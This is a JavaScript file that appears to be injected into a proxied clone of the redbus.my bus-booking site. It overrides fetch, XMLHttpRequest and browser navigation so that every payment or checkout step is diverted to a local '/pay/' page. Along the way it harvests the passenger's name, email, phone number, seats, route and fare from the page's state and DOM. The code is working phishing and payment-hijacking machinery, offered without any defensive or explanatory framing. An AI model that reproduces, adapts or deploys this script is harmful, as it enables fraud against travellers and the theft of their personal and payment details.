(function(){
  'use strict';

  function getUrl(input) {
    if (typeof input === 'string') return input;
    if (input instanceof Request) return input.url;
    return '';
  }
  function isPayApi(p) {
    return p.indexOf('/createOrder') !== -1 || p.indexOf('/orderInfo') !== -1
      || p.indexOf('/placeOrder') !== -1 || p.indexOf('/saveBooking') !== -1
      || p.indexOf('/proceedToPayment') !== -1 || p.indexOf('/paymentInit') !== -1;
  }
  function redirectPay() {
    var data = extractBookingData();
    if (data) {
      try { sessionStorage.setItem('redbus_booking', JSON.stringify(data)); } catch(ex) {}
      fetch('/pay/').then(function(r) { return r.text(); }).then(function(html) {
        document.open();
        document.write(html);
        document.close();
      }).catch(function() {
        window.onbeforeunload = null;
        location.replace('/pay/');
      });
    }
  }

  var _fetch = window.fetch;
  window.fetch = function(input, init) {
    var url = getUrl(input);
    if (url) {
      var p = url.split('?')[0];
      // Payment API: redirect to /pay/
      if (isPayApi(p)) { console.log('[Redbus Pay] Intercepted:', p); redirectPay(); return new Promise(function(){}); }
      // Route /redPay/ directly to redbus.my (proxy can't forward POST body)
      if (url.indexOf('/redPay/') !== -1) { input = 'https://www.redbus.my' + url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, ''); return _fetch.call(window, input, init); }
      // Strip redbus.my domain for other requests
      if (typeof input === 'string') input = input.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
    }
    return _fetch.call(window, input, init);
  };

  var _origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string') {
      url = url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
    }
    return _origOpen.call(this, method, url);
  };

  // Intercept page navigation to payment → redirect to /pay/
  function checkPayUrl(url) {
    if (typeof url === 'string') {
      var p = url.split('?')[0];
      if (p.indexOf('/paymentDetails') !== -1 || p.indexOf('/payment') !== -1 || p.indexOf('/checkout') !== -1) {
        redirectPay();
        return '/pay/';
      }
    }
    return url;
  }
  var _ps = history.pushState;
  history.pushState = function(s, t, u) { u = checkPayUrl(u); return _ps.call(this, s, t, u); };
  var _rs = history.replaceState;
  history.replaceState = function(s, t, u) { u = checkPayUrl(u); return _rs.call(this, s, t, u); };
  try { var _assign = location.assign.bind(location); location.assign = function(u) { return _assign(checkPayUrl(u)); }; } catch(e) {}
  try { var _rep = location.replace.bind(location); location.replace = function(u) { return _rep(checkPayUrl(u)); }; } catch(e) {}

  function extractBookingData() {
    var data = {};
    // Try Redux store first
    try {
      var store = window.__REDUX_STORE__ || window.__store || window.store;
      if (store) {
        var state = store.getState ? store.getState() : (store.state || {});
        // Try search results for route info
        if (state.search) {
          var r = state.search.searchResults;
          if (r) { data.origin = r.fromCityName || ''; data.destination = r.toCityName || ''; data.departureDate = r.doj || r.onward || ''; data.pax = r.passengerCount || 1; data.productType = 'Bus'; }
        }
        // Try passenger/customer info
        if (state.custInfo || state.passenger) {
          var ci = state.custInfo || state.passenger || {};
          data.passengerName = ci.name || ci.passengerName || '';
          data.email = ci.email || '';
          data.phone = ci.mobile || ci.phone || '';
          data.pax = ci.passengerCount || data.pax || 1;
          data.seats = ci.seatName || ci.seatNo || '';
        }
        // Try seat info
        if (state.seat || state.busDetails) {
          var s = state.seat || state.busDetails || {};
          data.busName = s.travelsName || s.operatorName || '';
          data.busType = s.busType || '';
          data.departureTime = s.departureTime || s.bpTime || '';
          data.arrivalTime = s.arrivalTime || s.dpTime || '';
          data.depPlace = s.bpName || s.boardingPoint || '';
          data.arrPlace = s.dpName || s.droppingPoint || '';
          data.duration = s.duration || '';
        }
      }
    } catch(ex) {}
    // Try pageData
    try { var pd = window.pageData || {}; data.origin = data.origin || pd.fromCity || ''; data.destination = data.destination || pd.toCity || ''; } catch(ex) {}
    // Try URL params
    if (!data.origin) {
      var sp = new URLSearchParams(location.search);
      data.origin = sp.get('fromCityName') || '';
      data.destination = sp.get('toCityName') || '';
      data.departureDate = sp.get('onward') || sp.get('doj') || '';
    }
    // Try DOM price
    try {
      var priceEls = document.querySelectorAll('[class*="fare"], [class*="price"], [class*="total"], [class*="amount"], [class*="Fare"], [data-autoid="totalPayable"]');
      for (var i = 0; i < priceEls.length; i++) {
        var pt = priceEls[i].textContent || '';
        var pm = pt.match(/[RM$MYR]?\s*([\d,]+\.?\d*)/);
        if (pm) { data.amount = pm[1].replace(/,/g, ''); data.currencySymbol = 'MYR'; break; }
      }
    } catch(ex) {}
    if (!data.productType) data.productType = 'Bus';
    if (!data.currency) data.currency = 'MYR';
    return data;
  }

  var style = document.createElement('style');
  style.textContent = '.modal-backdrop{display:none!important}body.modal-open{overflow:auto!important}';
  document.head.appendChild(style);
})();
